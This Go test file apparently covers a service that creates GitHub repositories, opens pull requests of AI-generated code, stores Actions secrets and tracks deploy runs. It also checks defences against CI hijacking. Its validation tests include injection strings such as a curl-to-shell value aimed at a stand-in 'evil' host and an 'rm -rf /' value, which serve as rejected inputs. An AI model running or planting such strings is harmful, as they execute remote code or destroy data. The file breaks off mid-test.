package service_test

import (
	"anz-training/internal/testutil"
	"context"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"crypto/rand"

	"golang.org/x/crypto/nacl/box"

	"anz-training/helper"
	"anz-training/model"
	"anz-training/service"
)

const fakeToken = "ghp_FAKEPERSONALACCESSTOKEN"

// fakeGitHub is a minimal GitHub REST double. It records every request.
type fakeGitHub struct {
	t      *testing.T
	srv    *httptest.Server
	mu     sync.Mutex
	calls  []string
	bodies map[string]map[string]any

	accountType    string // "Organization" | "User"
	contentFails   int    // number of 404s before the contents PUT succeeds
	prCreateStatus int    // override for POST /pulls
	mergeStatus    int    // override for PUT /pulls/N/merge

	// repeat-after-partial-success switches
	repoExists    bool   // POST create repo answers 422 "name already exists"
	varsExist     bool   // POST variables answers 409; PATCH variables/{name} succeeds
	contentsExist bool   // PUT contents without sha answers 422; GET contents gives a sha
	prMerged      bool   // GET /pulls/N reports merged
	createRepo422 string // when set, POST create repo answers 422 with this message

	// Actions secret encryption key pair; the test decrypts what the app sends
	varBodies       []map[string]any
	runs            []map[string]any // GET .../workflows/deploy.yml/runs (newest first)
	jobs            []map[string]any // GET .../runs/{id}/jobs
	annotations     []map[string]any // GET .../check-runs/{id}/annotations
	secretKeyStatus int              // override for GET .../secrets/public-key
	pubKey          *[32]byte
	privKey         *[32]byte
}

func newFakeGitHub(t *testing.T) *fakeGitHub {
	f := &fakeGitHub{t: t, bodies: map[string]map[string]any{}, accountType: "Organization"}
	var err error
	if f.pubKey, f.privKey, err = box.GenerateKey(rand.Reader); err != nil {
		t.Fatal(err)
	}
	f.srv = httptest.NewServer(http.HandlerFunc(f.handle))
	t.Cleanup(f.srv.Close)
	return f
}

func (f *fakeGitHub) called(sig string) bool {
	f.mu.Lock()
	defer f.mu.Unlock()
	for _, c := range f.calls {
		if c == sig {
			return true
		}
	}
	return false
}

func (f *fakeGitHub) reply(w http.ResponseWriter, status int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(v)
}

func (f *fakeGitHub) handle(w http.ResponseWriter, r *http.Request) {
	sig := r.Method + " " + r.URL.Path
	var body map[string]any
	raw, _ := io.ReadAll(r.Body)
	_ = json.Unmarshal(raw, &body)
	f.mu.Lock()
	f.calls = append(f.calls, sig)
	f.bodies[sig] = body
	f.mu.Unlock()

	if strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ") != fakeToken {
		f.reply(w, 401, map[string]string{"message": "bad token"})
		return
	}

	switch {
	case r.Method == "GET" && r.URL.Path == "/user":
		f.reply(w, 200, map[string]string{"login": "acme"})
	case r.Method == "GET" && strings.HasPrefix(r.URL.Path, "/users/"):
		f.reply(w, 200, map[string]string{"type": f.accountType})
	case r.Method == "POST" && (r.URL.Path == "/orgs/acme/repos" || r.URL.Path == "/user/repos"):
		name, _ := body["name"].(string)
		if f.createRepo422 != "" {
			f.reply(w, 422, map[string]string{"message": f.createRepo422})
			return
		}
		if f.repoExists {
			f.reply(w, 422, map[string]string{"message": "name already exists on this account"})
			return
		}
		f.reply(w, 201, map[string]string{"html_url": "https://github.com/acme/" + name, "default_branch": "main"})
	case r.Method == "GET" && strings.Count(r.URL.Path, "/") == 3 && strings.HasPrefix(r.URL.Path, "/repos/acme/"):
		f.reply(w, 200, map[string]string{"html_url": "https://github.com" + strings.TrimPrefix(r.URL.Path, "/repos"), "default_branch": "main"})
	case r.Method == "GET" && strings.Contains(r.URL.Path, "/contents/"):
		f.reply(w, 200, map[string]string{"sha": "abc123"})
	case r.Method == "GET" && strings.Contains(r.URL.Path, "/pulls/"):
		f.reply(w, 200, map[string]any{"merged": f.prMerged})
	case r.Method == "PATCH" && strings.Contains(r.URL.Path, "/actions/variables/"):
		w.WriteHeader(http.StatusNoContent)
	case r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/actions/workflows/deploy.yml/runs"):
		f.reply(w, 200, map[string]any{"workflow_runs": f.runs})
	case r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/jobs"):
		f.reply(w, 200, map[string]any{"jobs": f.jobs})
	case r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/annotations"):
		f.reply(w, 200, f.annotations)
	case r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/actions/secrets/public-key"):
		if f.secretKeyStatus != 0 {
			f.reply(w, f.secretKeyStatus, map[string]string{"message": "Resource not accessible by personal access token"})
			return
		}
		f.reply(w, 200, map[string]string{"key_id": "key-1", "key": base64.StdEncoding.EncodeToString(f.pubKey[:])})
	case r.Method == "PUT" && strings.Contains(r.URL.Path, "/actions/secrets/"):
		w.WriteHeader(http.StatusCreated)
	case r.Method == "POST" && strings.HasSuffix(r.URL.Path, "/actions/variables") && f.varsExist:
		f.reply(w, 409, map[string]string{"message": "Already exists"})
	case r.Method == "POST" && strings.HasSuffix(r.URL.Path, "/actions/variables"):
		f.mu.Lock()
		f.varBodies = append(f.varBodies, body)
		f.mu.Unlock()
		w.WriteHeader(http.StatusCreated)
	case r.Method == "PUT" && strings.Contains(r.URL.Path, "/contents/") && f.contentsExist && body["sha"] == nil:
		f.reply(w, 422, map[string]string{"message": "Invalid request. \"sha\" wasn't supplied."})
	case r.Method == "PUT" && strings.Contains(r.URL.Path, "/contents/"):
		f.mu.Lock()
		fail := f.contentFails > 0
		if fail {
			f.contentFails--
		}
		f.mu.Unlock()
		if fail {
			f.reply(w, 404, map[string]string{"message": "Not Found"})
			return
		}
		f.reply(w, 201, map[string]any{})
	case r.Method == "POST" && strings.HasSuffix(r.URL.Path, "/pulls"):
		if f.prCreateStatus != 0 {
			f.reply(w, f.prCreateStatus, map[string]string{"message": "A pull request already exists"})
			return
		}
		f.reply(w, 201, map[string]string{"html_url": "https://github.com/acme/repo/pull/7"})
	case r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/pulls"):
		f.reply(w, 200, []map[string]string{{"html_url": "https://github.com/acme/repo/pull/3"}})
	case r.Method == "POST" && strings.HasSuffix(r.URL.Path, "/dispatches"):
		w.WriteHeader(http.StatusNoContent)
	case r.Method == "PUT" && strings.HasSuffix(r.URL.Path, "/merge"):
		if f.mergeStatus != 0 {
			f.reply(w, f.mergeStatus, map[string]string{"message": "Pull Request is not mergeable"})
			return
		}
		f.reply(w, 200, map[string]any{"merged": true})
	default:
		f.reply(w, 404, map[string]string{"message": "unexpected " + sig})
	}
}

func newGH(t *testing.T, f *fakeGitHub, gitURL string) *service.GitHub {
	t.Helper()
	return service.NewGitHub(service.GitHubConfig{
		WebhookURL: "https://builder.example.com/api/webhooks/github", WebhookSecret: "whsec_abc123",
		APIURL: f.srv.URL, GitURL: gitURL, RetryDelay: time.Millisecond,
	})
}

var gcpEmpty = model.GCPCreds{}

var (
	ghCreds = model.GitHubCreds{Owner: "acme", Token: fakeToken}
)

func TestGitHub_TokenOwner(t *testing.T) {
	f := newFakeGitHub(t)
	g := newGH(t, f, "")

	owner, err := g.TokenOwner(context.Background(), fakeToken)
	if err != nil || owner != "acme" {
		t.Fatalf("owner = %q, %v", owner, err)
	}
	if _, err := g.TokenOwner(context.Background(), "ghp_wrong"); err == nil {
		t.Fatal("a rejected token must fail")
	}
	// a creds payload without a token never reaches GitHub
	if _, err := g.CreateRepo(context.Background(), model.GitHubCreds{Owner: "acme"}, model.GCPCreds{}, "p1", "x"); err == nil {
		t.Fatal("missing token must fail")
	}
}

func TestGitHub_ServiceName(t *testing.T) {
	cases := map[string]string{
		"My Cool App!": "my-cool-app-1234abcd",
		"123 start":    "app-123-start-1234abcd",
		"":             "app-1234abcd",
		"  --x--  ":    "x-1234abcd",
		"Ünïcode Name": "n-code-name-1234abcd",
	}
	for in, want := range cases {
		if got := service.ServiceName(in, "1234abcd-ffff-4000-8000-000000000000"); got != want {
			t.Errorf("ServiceName(%q) = %q, want %q", in, got, want)
		}
	}
	long := service.ServiceName(strings.Repeat("a", 200), "1234abcd-0000")
	if len(long) > 63 {
		t.Errorf("name too long: %d", len(long))
	}
}

func TestGitHub_RenderDeployWorkflow(t *testing.T) {
	d := service.DeployData{BranchName: "main", ServiceName: "svc-1", ProjectID: "proj-uuid"}
	out, err := service.RenderDeployWorkflow(d)
	if err != nil {
		t.Fatal(err)
	}
	s := string(out)
	for _, want := range []string{
		"${GCP_REGION}-docker.pkg.dev/${GCP_PROJECT_ID}/${GCP_ARTIFACT_REPO}/svc-1:",
		"workload_identity_provider: ${{ vars.GCP_WIF_PROVIDER }}",
		"WEBHOOK_SECRET: ${{ secrets.WEBHOOK_SECRET }}",
		`"project_id":"proj-uuid"`, // our id, not the GCP project
		`X-Webhook-Secret: $WEBHOOK_SECRET`, "paths-ignore",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("workflow missing %q", want)
		}
	}
	if strings.Contains(s, "[[") {
		t.Error("unrendered template actions left")
	}
	if !strings.Contains(s, "${{ github.sha }}") || !strings.Contains(s, "${{ steps.deploy.outputs.url }}") {
		t.Error("GitHub Actions expressions were altered")
	}

	// values that could break out of the YAML/shell quoting are rejected
	for _, bad := range []string{"x' ; curl evil | sh #", "a b", "x\ny", "$(id)", "`id`", ""} {
		d2 := d
		d2.ServiceName = bad
		if _, err := service.RenderDeployWorkflow(d2); err == nil {
			t.Errorf("ServiceName %q should be rejected", bad)
		}
	}
}

func TestGitHub_CreateRepo_Org(t *testing.T) {
	f := newFakeGitHub(t)
	f.contentFails = 2 // main not ready yet: must retry
	g := newGH(t, f, "")

	url, err := g.CreateRepo(context.Background(), ghCreds, testutil.GCPCreds, "1234abcd-0000-4000-8000-000000000000", "My App")
	if err != nil {
		t.Fatal(err)
	}
	if url != "https://github.com/acme/my-app-1234abcd" {
		t.Fatalf("repo url = %q", url)
	}
	body := f.bodies["POST /orgs/acme/repos"]
	if body["private"] != true || body["auto_init"] != true || body["name"] != "my-app-1234abcd" {
		t.Fatalf("create body = %#v", body)
	}
	put := f.bodies["PUT /repos/acme/my-app-1234abcd/contents/.github/workflows/deploy.yml"]
	if put == nil || put["branch"] != "main" {
		t.Fatalf("workflow commit = %#v", put)
	}
	raw, _ := base64.StdEncoding.DecodeString(put["content"].(string))
	if !strings.Contains(string(raw), "my-app-1234abcd:") ||
		!strings.Contains(string(raw), `"project_id":"1234abcd-0000-4000-8000-000000000000"`) {
		t.Fatalf("workflow content wrong:\n%s", raw)
	}
}

func TestGitHub_CreateRepo_PersonalAccountAndErrors(t *testing.T) {
	f := newFakeGitHub(t)
	f.accountType = "User"
	g := newGH(t, f, "")
	if _, err := g.CreateRepo(context.Background(), ghCreds, testutil.GCPCreds, "id-1", "x"); err != nil {
		t.Fatal(err)
	}
	if !f.called("POST /user/repos") {
		t.Fatal("personal account should use /user/repos")
	}

	// invalid GCP config never reaches GitHub
	f2 := newFakeGitHub(t)
	g2 := newGH(t, f2, "")
	bad := testutil.GCPCreds
	bad.WIFProvider = "x' && rm -rf / #"
	if _, err := g2.CreateRepo(context.Background(), ghCreds, bad, "id-1", "x"); err == nil {
		t.Fatal("expected validation error")
	}
	if len(f2.calls) != 0 {
		t.Fatalf("GitHub was called despite invalid config: %v", f2.calls)
	}
}

func TestGitHub_MergePR(t *testing.T) {
	f := newFakeGitHub(t)
	g := newGH(t, f, "")
	ctx := context.Background()

	if err := g.MergePR(ctx, ghCreds, "https://github.com/acme/repo", "https://github.com/acme/repo/pull/7"); err != nil {
		t.Fatal(err)
	}
	if got := f.bodies["PUT /repos/acme/repo/pulls/7/merge"]["merge_method"]; got != "squash" {
		t.Fatalf("merge_method = %v", got)
	}

	for name, args := range map[string][2]string{
		"foreign repo":  {"https://github.com/evil/repo", "https://github.com/evil/repo/pull/7"},
		"pr other repo": {"https://github.com/acme/repo", "https://github.com/acme/other/pull/7"},
		"bad pr url":    {"https://github.com/acme/repo", "https://github.com/acme/repo/issues/7"},
		"bad pr number": {"https://github.com/acme/repo", "https://github.com/acme/repo/pull/abc"},
	} {
		before := len(f.calls)
		if err := g.MergePR(ctx, ghCreds, args[0], args[1]); err == nil {
			t.Errorf("%s: expected error", name)
		}
		if len(f.calls) != before {
			t.Errorf("%s: GitHub called despite invalid input", name)
		}
	}

	f.mergeStatus = 405
	if err := g.MergePR(ctx, ghCreds, "https://github.com/acme/repo", "https://github.com/acme/repo/pull/7"); err == nil ||
		!strings.Contains(err.Error(), "405") {
		t.Fatalf("want 405 error, got %v", err)
	}
}

// ---- PushAndOpenPR against a real local git "remote" ----

func gitCmd(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_TERMINAL_PROMPT=0")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return string(out)
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// seedRemoteFiles creates <root>/acme/repo.git with a main branch holding the given files
// and returns root, to be used as the git URL base (file://<root>).
func seedRemoteFiles(t *testing.T, files map[string]string) (root string) {
	t.Helper()
	root = t.TempDir()
	bare := bareRepo(root)
	if err := os.MkdirAll(bare, 0o755); err != nil {
		t.Fatal(err)
	}
	gitCmd(t, bare, "init", "-q", "--bare", "--initial-branch=main")
	seed := t.TempDir()
	gitCmd(t, seed, "init", "-q", "--initial-branch=main")
	for name, content := range files {
		write(t, filepath.Join(seed, name), content)
	}
	gitCmd(t, seed, "add", "-A")
	gitCmd(t, seed, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "init")
	gitCmd(t, seed, "push", "-q", bare, "main")
	return root
}

func bareRepo(root string) string { return filepath.Join(root, "acme", "repo.git") }

// seedRemote is a remote like CreateRepo leaves it: a README and the trusted deploy workflow.
func seedRemote(t *testing.T) (root string) {
	t.Helper()
	return seedRemoteFiles(t, map[string]string{"README.md": "# repo\n", ".github/workflows/deploy.yml": "TRUSTED\n"})
}

func TestGitHub_PushAndOpenPR(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	f := newFakeGitHub(t)
	remoteRoot := seedRemote(t)
	g := newGH(t, f, "file://"+remoteRoot)

	ws := t.TempDir()
	write(t, filepath.Join(ws, "main.go"), "package main\n")
	write(t, filepath.Join(ws, "Dockerfile"), "FROM scratch\n")
	// generated code tries to hijack CI
	write(t, filepath.Join(ws, ".github/workflows/deploy.yml"), "EVIL\n")
	write(t, filepath.Join(ws, ".github/workflows/extra.yml"), "EVIL2\n")

	prURL, err := g.PushAndOpenPR(context.Background(), ws, ghCreds, "https://github.com/acme/repo", "main")
	if err != nil {
		t.Fatal(err)
	}
	if prURL != "https://github.com/acme/repo/pull/7" {
		t.Fatalf("pr url = %q", prURL)
	}
	pr := f.bodies["POST /repos/acme/repo/pulls"]
	if pr["head"] != "feature/ai-gen" || pr["base"] != "main" {
		t.Fatalf("pr body = %#v", pr)
	}

	bare := filepath.Join(remoteRoot, "acme", "repo.git")
	show := func(path string) string { return gitCmd(t, bare, "show", "feature/ai-gen:"+path) }
	if show("main.go") != "package main\n" || show("Dockerfile") != "FROM scratch\n" {
		t.Fatal("generated files not pushed")
	}
	if show("README.md") != "# repo\n" {
		t.Fatal("README from base was dropped")
	}
	if show(".github/workflows/deploy.yml") != "TRUSTED\n" {
		t.Fatal("generated code replaced the deploy workflow")
	}
	if files := gitCmd(t, bare, "ls-tree", "-r", "--name-only", "feature/ai-gen"); strings.Contains(files, "extra.yml") {
		t.Fatalf("extra workflow leaked into PR:\n%s", files)
	}
	// feature branch builds on main history (PR is possible) and main is untouched
	gitCmd(t, bare, "merge-base", "--is-ancestor", "main", "feature/ai-gen") // fails the test if unrelated
	if strings.TrimSpace(gitCmd(t, bare, "rev-list", "--count", "main")) != "1" {
		t.Fatal("main was modified")
	}
	if _, err := os.Stat(filepath.Join(ws, ".git", "config")); err == nil {
		cfg, _ := os.ReadFile(filepath.Join(ws, ".git", "config"))
		if strings.Contains(string(cfg), fakeToken) || strings.Contains(string(cfg), base64.StdEncoding.EncodeToString([]byte("x-access-token:"+fakeToken))) {
			t.Fatal("token persisted in .git/config")
		}
	}
}

func TestGitHub_PushAndOpenPR_ExistingPRAndGuards(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	f := newFakeGitHub(t)
	remoteRoot := seedRemote(t)
	g := newGH(t, f, "file://"+remoteRoot)
	ctx := context.Background()

	// PR already open (job retry): reuse it
	f.prCreateStatus = 422
	ws := t.TempDir()
	write(t, filepath.Join(ws, "main.go"), "package main\n")
	prURL, err := g.PushAndOpenPR(ctx, ws, ghCreds, "https://github.com/acme/repo", "main")
	if err != nil || prURL != "https://github.com/acme/repo/pull/3" {
		t.Fatalf("existing PR: %q, %v", prURL, err)
	}

	// foreign repo is refused before any token is minted
	before := len(f.calls)
	if _, err := g.PushAndOpenPR(ctx, t.TempDir(), ghCreds, "https://github.com/evil/repo", "main"); err == nil {
		t.Fatal("expected refusal for foreign repo")
	}
	if len(f.calls) != before {
		t.Fatal("GitHub called for a foreign repo")
	}

	// a workspace identical to base has nothing to commit
	same := t.TempDir()
	write(t, filepath.Join(same, "README.md"), "# repo\n")
	if _, err := g.PushAndOpenPR(ctx, same, ghCreds, "https://github.com/acme/repo", "main"); err == nil ||
		!strings.Contains(err.Error(), "nothing to commit") {
		t.Fatalf("want nothing-to-commit error, got %v", err)
	}
}

// A repo created without a deploy workflow (no GCP) has no .github on main.
func TestGitHub_PushAndOpenPR_NoWorkflowOnBase(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	f := newFakeGitHub(t)
	root := seedRemoteFiles(t, map[string]string{"README.md": "# repo\n"})

	ws := t.TempDir()
	write(t, filepath.Join(ws, "main.go"), "package main\n")
	write(t, filepath.Join(ws, ".github/workflows/evil.yml"), "EVIL\n") // generated CI is never trusted
	g := newGH(t, f, "file://"+root)
	if _, err := g.PushAndOpenPR(context.Background(), ws, ghCreds, "https://github.com/acme/repo", "main"); err != nil {
		t.Fatal(err)
	}
	if out := gitCmd(t, bareRepo(root), "ls-tree", "-r", "--name-only", "feature/ai-gen"); !strings.Contains(out, "main.go") || strings.Contains(out, "evil.yml") {
		t.Fatalf("pushed tree:\n%s", out)
	}
}

func TestGitHub_DispatchWorkflow(t *testing.T) {
	f := newFakeGitHub(t)
	g := newGH(t, f, "")
	ctx := context.Background()
	if err := g.DispatchWorkflow(ctx, ghCreds, "https://github.com/acme/repo", "deploy.yml", "main"); err != nil {
		t.Fatal(err)
	}
	sig := "POST /repos/acme/repo/actions/workflows/deploy.yml/dispatches"
	if !f.called(sig) {
		t.Fatalf("calls = %v", f.calls)
	}
	if f.bodies[sig]["ref"] != "main" {
		t.Fatalf("body = %v", f.bodies[sig])
	}

	before := len(f.calls)
	if err := g.DispatchWorkflow(ctx, ghCreds, "https://github.com/evil/repo", "deploy.yml", "main"); err == nil {
		t.Fatal("foreign repo must be refused")
	}
	if len(f.calls) != before {
		t.Fatal("GitHub was called for a foreign repo")
	}
	if err := g.DispatchWorkflow(ctx, model.GitHubCreds{Owner: "acme"}, "https://github.com/acme/repo", "deploy.yml", "main"); err == nil {
		t.Fatal("missing token must fail")
	}
}

func TestGitHub_CreateRepo_CommitsIaC(t *testing.T) {
	f := newFakeGitHub(t)
	g := newGH(t, f, "")
	creds := testutil.GCPCreds
	creds.RuntimeServiceAccount = runtimeSA
	if _, err := g.CreateRepo(context.Background(), ghCreds, creds, "1234abcd-0000-4000-8000-000000000000", "My App"); err != nil {
		t.Fatal(err)
	}
	wf := f.bodies["PUT /repos/acme/my-app-1234abcd/contents/.github/workflows/deploy.yml"]
	sv := f.bodies["PUT /repos/acme/my-app-1234abcd/contents/service.yml"]
	if wf == nil || sv == nil {
		t.Fatalf("both files must be committed, calls: %v", f.calls)
	}
	for name, put := range map[string]map[string]any{"workflow": wf, "service.yml": sv} {
		if msg, _ := put["message"].(string); !strings.HasSuffix(msg, "[skip ci]") {
			t.Errorf("%s commit message %q must end with [skip ci]", name, msg)
		}
	}
	raw, _ := base64.StdEncoding.DecodeString(sv["content"].(string))
	if !strings.Contains(string(raw), "name: my-app-1234abcd") || !strings.Contains(string(raw), "serviceAccountName: "+runtimeSA) {
		t.Fatalf("service.yml content:\n%s", raw)
	}

	// no GCP config (repo-only / demo): no deploy files
	f2 := newFakeGitHub(t)
	if _, err := newGH(t, f2, "").CreateRepo(context.Background(), ghCreds, gcpEmpty, "id-1", "x"); err != nil {
		t.Fatal(err)
	}
	for _, c := range f2.calls {
		if strings.HasPrefix(c, "PUT ") {
			t.Fatalf("no files expected without GCP config, got %s", c)
		}
	}
}

func TestGitHub_PushAndOpenPR_RestoresServiceYML(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	root := seedRemoteFiles(t, map[string]string{"README.md": "# repo\n", "service.yml": "TRUSTED\n"})

	ws := t.TempDir()
	write(t, filepath.Join(ws, "main.go"), "package main\n")
	write(t, filepath.Join(ws, "service.yml"), "EVIL: expose everything\n") // generated code must not change IaC
	g := newGH(t, newFakeGitHub(t), "file://"+root)
	if _, err := g.PushAndOpenPR(context.Background(), ws, ghCreds, "https://github.com/acme/repo", "main"); err != nil {
		t.Fatal(err)
	}
	if got := gitCmd(t, bareRepo(root), "show", "feature/ai-gen:service.yml"); strings.TrimSpace(got) != "TRUSTED" {
		t.Fatalf("service.yml on the PR branch = %q", got)
	}
}

// The deploy workflow must hold no config literal and no secret: GCP settings are
// repo variables and the webhook secret is an encrypted Actions secret.
func TestGitHub_CreateRepo_ConfiguresActionsVarsAndSecret(t *testing.T) {
	f := newFakeGitHub(t)
	g := newGH(t, f, "")
	const projectID = "1234abcd-0000-4000-8000-000000000000"
	if _, err := g.CreateRepo(context.Background(), ghCreds, testutil.GCPCreds, projectID, "My App"); err != nil {
		t.Fatal(err)
	}
	base := "/repos/acme/my-app-1234abcd/actions/"

	got := map[string]string{}
	f.mu.Lock()
	defer f.mu.Unlock()
	for _, v := range f.varBodies {
		got[v["name"].(string)] = v["value"].(string)
	}
	want := map[string]string{
		"GCP_PROJECT_ID": testutil.GCPCreds.ProjectID, "GCP_REGION": testutil.GCPCreds.Region, "GCP_ARTIFACT_REPO": testutil.GCPCreds.ArtifactRepo,
		"GCP_WIF_PROVIDER": testutil.GCPCreds.WIFProvider, "GCP_SERVICE_ACCOUNT": testutil.GCPCreds.ServiceAccount,
		"WEBHOOK_URL": "https://builder.example.com/api/webhooks/github",
	}
	for k, v := range want {
		if got[k] != v {
			t.Errorf("variable %s = %q, want %q", k, got[k], v)
		}
	}

	sec := f.bodies["PUT "+base+"secrets/WEBHOOK_SECRET"]
	if sec == nil || sec["key_id"] != "key-1" {
		t.Fatalf("webhook secret not stored: %#v", sec)
	}
	enc, _ := base64.StdEncoding.DecodeString(sec["encrypted_value"].(string))
	plain, ok := box.OpenAnonymous(nil, enc, f.pubKey, f.privKey)
	if !ok || string(plain) != helper.WebhookSecretFor("whsec_abc123", projectID) {
		t.Fatalf("secret did not decrypt to the per-project webhook secret (ok=%v)", ok)
	}

	// nothing configurable or secret is committed in the workflow
	put := f.bodies["PUT /repos/acme/my-app-1234abcd/contents/.github/workflows/deploy.yml"]
	raw, _ := base64.StdEncoding.DecodeString(put["content"].(string))
	for _, lit := range []string{string(plain), testutil.GCPCreds.WIFProvider, testutil.GCPCreds.ServiceAccount, testutil.GCPCreds.ProjectID, "https://builder.example.com"} {
		if strings.Contains(string(raw), lit) {
			t.Errorf("workflow still contains literal %q", lit)
		}
	}
}

func TestGitHub_CreateRepo_ActionsSetupFailureFailsCreate(t *testing.T) {
	f := newFakeGitHub(t)
	f.secretKeyStatus = 403
	if _, err := newGH(t, f, "").CreateRepo(context.Background(), ghCreds, testutil.GCPCreds, "id-1", "x"); err == nil {
		t.Fatal("a repo without its deploy secret would fail silently later; CreateRepo must return the error")
	}
}

// ---- reading the deploy run (polling instead of a webhook) ----

func step(name, status, conclusion string) map[string]any {
	return map[string]any{"name": name, "status": status, "conclusion": conclusion}
}

func runAt(id int, created time.Time, status, conclusion string) map[string]any {
	return map[string]any{"id": id, "status": status, "conclusion": conclusion, "created_at": created.UTC().Format(time.RFC3339)}
}

func watchRun(t *testing.T, f *fakeGitHub, since time.Time) service.DeployRun {
	t.Helper()
	run, err := newGH(t, f, "").DeployRun(context.Background(), ghCreds, "https://github.com/acme/my-app-1234abcd", since)
	if err != nil {
		t.Fatal(err)
	}
	return run
}

func TestGitHub_DeployRun_SuccessReadsTheLiveURLAnnotation(t *testing.T) {
	f := newFakeGitHub(t)
	created := time.Unix(2000, 0).UTC()
	f.runs = []map[string]any{runAt(11, created, "completed", "success")}
	f.jobs = []map[string]any{{"id": 99, "steps": []map[string]any{
		step("Set up job", "completed", "success"), step("Build", "completed", "success"),
		step("Test", "completed", "success"), step("Deploy", "completed", "success"),
	}}}
	f.annotations = []map[string]any{
		{"title": "other", "message": "noise"},
		{"title": "live_url", "message": "https://my-app-1234abcd-386127327935.asia-southeast1.run.app"},
	}
	run := watchRun(t, f, time.Unix(1500, 0))
	want := service.DeployRun{Found: true, CreatedAt: created, Done: true, Conclusion: "success", Step: "deploying",
		LiveURL: "https://my-app-1234abcd-386127327935.asia-southeast1.run.app"}
	if run != want {
		t.Fatalf("run = %+v, want %+v", run, want)
	}
}

func TestGitHub_DeployRun_ProgressAndFailure(t *testing.T) {
	cases := []struct {
		name  string
		steps []map[string]any
		runSt string
		concl string
		want  service.DeployRun
	}{
		{"queued", nil, "queued", "", service.DeployRun{Found: true}},
		{"building", []map[string]any{step("Build", "in_progress", ""), step("Test", "pending", ""), step("Deploy", "pending", "")},
			"in_progress", "", service.DeployRun{Found: true, Step: "building"}},
		{"testing", []map[string]any{step("Build", "completed", "success"), step("Test", "in_progress", ""), step("Deploy", "pending", "")},
			"in_progress", "", service.DeployRun{Found: true, Step: "testing"}},
		{"test fails", []map[string]any{step("Build", "completed", "success"), step("Test", "completed", "failure"), step("Deploy", "completed", "skipped")},
			"completed", "failure", service.DeployRun{Found: true, Done: true, Conclusion: "failure", Step: "testing", FailedStage: "test"}},
		{"setup fails", []map[string]any{step("Set up job", "completed", "failure"), step("Build", "completed", "skipped")},
			"completed", "failure", service.DeployRun{Found: true, Done: true, Conclusion: "failure"}},
	}
	for _, tc := range cases {
		f := newFakeGitHub(t)
		f.runs = []map[string]any{runAt(1, time.Unix(2000, 0), tc.runSt, tc.concl)}
		f.jobs = []map[string]any{{"id": 5, "steps": tc.steps}}
		tc.want.CreatedAt = time.Unix(2000, 0).UTC()
		if got := watchRun(t, f, time.Unix(1500, 0)); got != tc.want {
			t.Errorf("%s: run = %+v, want %+v", tc.name, got, tc.want)
		}
	}
}

func TestGitHub_DeployRun_OnlyRunsCreatedSince(t *testing.T) {
	f := newFakeGitHub(t)
	f.runs = []map[string]any{runAt(2, time.Unix(2000, 0), "in_progress", ""), runAt(1, time.Unix(1000, 0), "completed", "success")}
	f.jobs = []map[string]any{{"id": 5, "steps": []map[string]any{}}}
	if run := watchRun(t, f, time.Unix(1500, 0)); !run.Found || !run.CreatedAt.Equal(time.Unix(2000, 0)) {
		t.Fatalf("want the newer run, got %+v", run)
	}
	// an old run (a previous deploy) is not this deploy's
	if run := watchRun(t, f, time.Unix(3000, 0)); run.Found {
		t.Fatalf("a run older than since must be ignored: %+v", run)
	}
	if f.called("GET /repos/acme/my-app-1234abcd/actions/runs/2/jobs") == false {
		t.Fatal("jobs of the chosen run were not read")
	}
}

func TestGitHub_DeployRun_SuccessWithoutAnnotationHasNoURL(t *testing.T) {
	f := newFakeGitHub(t)
	f.runs = []map[string]any{runAt(1, time.Unix(2000, 0), "completed", "success")}
	f.jobs = []map[string]any{{"id": 5, "steps": []map[string]any{step("Deploy", "completed", "success")}}}
	if run := watchRun(t, f, time.Unix(1500, 0)); !run.Done || run.LiveURL != "" {
		t.Fatalf("run = %+v", run)
	}
}

// Polling mode: with no webhook configured the repo gets no webhook variable or secret.
func TestGitHub_CreateRepo_NoWebhookConfigured(t *testing.T) {
	f := newFakeGitHub(t)
	g := service.NewGitHub(service.GitHubConfig{APIURL: f.srv.URL, RetryDelay: time.Millisecond})
	if _, err := g.CreateRepo(context.Background(), ghCreds, testutil.GCPCreds, "1234abcd-0000-4000-8000-000000000000", "My App"); err != nil {
		t.Fatal(err)
	}
	f.mu.Lock()
	defer f.mu.Unlock()
	for _, v := range f.varBodies {
		if v["name"] == "WEBHOOK_URL" {
			t.Error("WEBHOOK_URL must not be set in polling mode")
		}
	}
	if len(f.varBodies) != 5 {
		t.Errorf("want the 5 GCP variables, got %d", len(f.varBodies))
	}
	for _, c := range f.calls {
		if strings.Contains(c, "/secrets/") {
			t.Errorf("no secret expected without a webhook, got %s", c)
		}
	}
}

func TestGitHub_CreateRepo_RepeatAfterPartialSuccess(t *testing.T) {
	f := newFakeGitHub(t)
	f.repoExists, f.varsExist, f.contentsExist = true, true, true
	g := newGH(t, f, "")

	url, err := g.CreateRepo(context.Background(), ghCreds, testutil.GCPCreds, "1234abcd-0000-4000-8000-000000000000", "My App")
	if err != nil {
		t.Fatal(err)
	}
	if url != "https://github.com/acme/my-app-1234abcd" {
		t.Fatalf("repo url = %q", url)
	}
	if !f.called("PATCH /repos/acme/my-app-1234abcd/actions/variables/GCP_PROJECT_ID") {
		t.Fatalf("existing variable was not updated: %v", f.calls)
